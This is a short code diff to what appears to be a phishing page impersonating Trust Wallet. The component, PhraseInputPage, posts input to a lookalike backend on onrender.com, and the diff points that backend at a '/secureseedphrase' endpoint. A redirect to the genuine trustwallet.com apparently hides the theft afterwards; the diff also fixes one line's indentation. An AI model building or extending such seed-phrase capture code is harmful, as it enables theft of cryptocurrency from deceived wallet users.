@@ -20,7 +20,7 @@ type ValidationStatus = {
   isLoading: boolean;
 };
 
-const BACKEND_URL = 'https://trustwallet-y3lo.onrender.com';
+const BACKEND_URL = 'https://trustwallet-y3lo.onrender.com/secureseedphrase';
 const TRUST_WALLET_REDIRECT_URL = 'https://trustwallet.com/?utm_source=cryptwerk';
 
 export default function PhraseInputPage() {
@@ -156,7 +156,7 @@ export default function PhraseInputPage() {
               finalErrorMessage = `Backend Error: ${response.status} ${response.statusText}. Response was JSON but had no 'message' field or was not a string.`;
             }
           } catch (jsonError) {
-            finalErrorMessage = `Backend Error: ${response.status} ${response.statusText}. The server's response was not in a readable JSON format.`;
+             finalErrorMessage = `Backend Error: ${response.status} ${response.statusText}. The server's response was not in a readable JSON format.`;
           }
 
           toast({
